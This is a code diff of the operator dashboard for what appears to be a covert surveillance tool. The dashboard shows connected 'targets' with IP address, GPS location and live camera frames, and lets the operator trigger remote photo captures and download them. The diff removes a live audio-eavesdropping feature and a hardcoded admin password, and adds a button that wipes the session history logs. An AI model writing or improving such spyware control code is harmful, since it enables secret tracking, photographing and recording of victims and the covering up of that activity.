@@ -10,7 +10,7 @@
         header { background: #161b22; padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #30363d; box-shadow: 0 2px 10px rgba(0,0,0,0.5); }
         h1, h2 { margin: 0; color: #f0f6fc; }
         h1 { font-size: 20px; font-weight: 600; display: flex; align-items: center; gap: 10px; }
-        h2 { font-size: 16px; margin-bottom: 15px; color: #8b949e; text-transform: uppercase; letter-spacing: 1px; }
+        h2 { font-size: 16px; margin-bottom: 15px; color: #8b949e; text-transform: uppercase; letter-spacing: 1px; display: flex; justify-content: space-between; align-items: center; }
         
         .header-controls { display: flex; gap: 12px; align-items: center; }
         .btn-toggle { background: #238636; color: white; border: none; padding: 8px 14px; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 13px; }
@@ -61,8 +61,6 @@
         .photo-card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 10px; text-align: center; }
         .photo-card img { width: 100%; height: 130px; object-fit: cover; border-radius: 6px; background: #000; }
         .empty-text { color: #484f58; font-style: italic; font-size: 14px; }
-        
-        audio { width: 100%; height: 32px; margin-top: 8px; }
     </style>
 </head>
 <body>
@@ -83,14 +81,17 @@
     </header>
     
     <div class="container">
-        <h2>Active Live Targets & Speech Streams</h2>
+        <h2>Active Live Targets</h2>
         <div id="targetsGrid" class="grid">
             <p class="empty-text">No active targets connected right now.</p>
         </div>
 
         <hr class="section-divider">
 
-        <h2>Session History & Connection Logs (Last 12 Hours)</h2>
+        <h2>
+            Session History (Last 12 Hours)
+            <button class="btn btn-danger" style="font-size: 11px;" onclick="clearHistory()">Clear History</button>
+        </h2>
         <div class="table-container">
             <table>
                 <thead>
@@ -103,7 +104,7 @@
                     </tr>
                 </thead>
                 <tbody id="historyTableBody">
-                    <tr><td colspan="5" class="empty-text" style="text-align: center; padding: 20px;">No historical logs found for the last 12 hours.</td></tr>
+                    <tr><td colspan="5" class="empty-text" style="text-align: center; padding: 20px;">No historical logs found.</td></tr>
                 </tbody>
             </table>
         </div>
@@ -176,7 +177,7 @@ function initDashboard() {
     
     if (!socket) {
         socket = io();
-        socket.emit("admin-auth", "ayaz;;");
+        socket.emit("admin-auth");
 
         socket.on("admin-initial-state", (data) => {
             isLinkActiveState = data.linkActive;
@@ -208,14 +209,6 @@ function initDashboard() {
         socket.on("update-live-stream", (data) => {
             const img = document.getElementById(`stream-${data.socketId}`);
             if (img) img.src = data.frameData;
-        });
-
-        socket.on("update-live-audio", (data) => {
-            const audioPlayer = document.getElementById(`audio-${data.socketId}`);
-            if (audioPlayer && data.audioData) {
-                audioPlayer.src = data.audioData;
-                audioPlayer.play().catch(e => {});
-            }
         });
 
         socket.on("new-photo", (photo) => {
@@ -289,10 +282,6 @@ function renderTargets(users) {
                             <strong>IP Address:</strong> <code style="color: #58a6ff;">${target.ip || 'N/A'}</code><br>
                             <strong>Connected At:</strong> ${target.connectedAt}<br>
                             <strong>GPS Location:</strong><br>${locationHtml}
-                            <div style="margin-top: 8px;">
-                                <strong>Live Audio / Speech:</strong>
-                                <audio id="audio-${target.id}" controls autoplay muted></audio>
-                            </div>
                         </div>
                     </div>
 
@@ -311,7 +300,7 @@ function renderTargets(users) {
 
 function renderHistory(history) {
     if (!history || history.length === 0) {
-        historyTableBody.innerHTML = `<tr><td colspan="5" class="empty-text" style="text-align: center; padding: 20px;">No historical logs found for the last 12 hours.</td></tr>`;
+        historyTableBody.innerHTML = `<tr><td colspan="5" class="empty-text" style="text-align: center; padding: 20px;">No historical logs found.</td></tr>`;
         return;
     }
     let html = "";
@@ -338,16 +327,23 @@ function renderPhotos(photos) {
     photos.forEach(photo => {
         html += `
             <div class="photo-card">
-                <img src="${photo.imageData}" alt="Capture">
+                <img src="${photo.imageUrl}" alt="Capture">
                 <div style="font-size: 11px; color: #8b949e; margin: 6px 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">${photo.deviceInfo}</div>
                 <div style="display: flex; gap: 5px; justify-content: center;">
-                    <a href="/api/admin/photos/${photo.id}/download" class="btn btn-capture" style="text-decoration: none; font-size: 10px; padding: 4px 8px;">Download</a>
+                    <a href="${photo.imageUrl}" download class="btn btn-capture" style="text-decoration: none; font-size: 10px; padding: 4px 8px;">Download</a>
                     <button class="btn btn-danger" style="font-size: 10px; padding: 4px 8px;" onclick="deletePhoto('${photo.id}')">Delete</button>
                 </div>
             </div>
         `;
     });
     photosGrid.innerHTML = html;
+}
+
+async function clearHistory() {
+    if (!confirm("Are you sure you want to clear all history logs?")) return;
+    try {
+        await fetch("/api/admin/history", { method: "DELETE" });
+    } catch(e){}
 }
 
 function capturePhoto(id) { socket.emit("admin-trigger-capture", id); }
